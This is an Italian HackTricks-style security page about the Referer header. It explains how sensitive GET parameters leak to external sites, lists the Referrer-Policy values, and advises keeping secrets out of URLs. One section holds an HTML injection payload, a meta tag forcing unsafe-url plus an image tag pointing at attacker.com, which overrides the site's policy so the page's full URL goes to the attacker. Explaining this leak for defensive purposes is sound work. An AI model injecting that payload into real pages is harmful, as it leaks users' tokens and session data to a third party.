{{#include ../banners/hacktricks-training.md}}

# Intestazioni e politiche del referrer

Il referrer è l'intestazione utilizzata dai browser per indicare quale fosse la pagina precedente visitata.

## Informazioni sensibili trapelate

Se in un certo momento all'interno di una pagina web si trovano informazioni sensibili nei parametri di una richiesta GET, se la pagina contiene link a fonti esterne o un attaccante è in grado di far visitare (ingegneria sociale) all'utente un URL controllato dall'attaccante. Potrebbe essere in grado di esfiltrare le informazioni sensibili all'interno dell'ultima richiesta GET.

## Mitigazione

Puoi far seguire al browser una **Referrer-policy** che potrebbe **evitare** che le informazioni sensibili vengano inviate ad altre applicazioni web:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Contromisure

Puoi sovrascrivere questa regola utilizzando un tag meta HTML (l'attaccante deve sfruttare un'iniezione HTML):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Difesa

Non inserire mai dati sensibili all'interno dei parametri GET o dei percorsi nell'URL.

{{#include ../banners/hacktricks-training.md}}
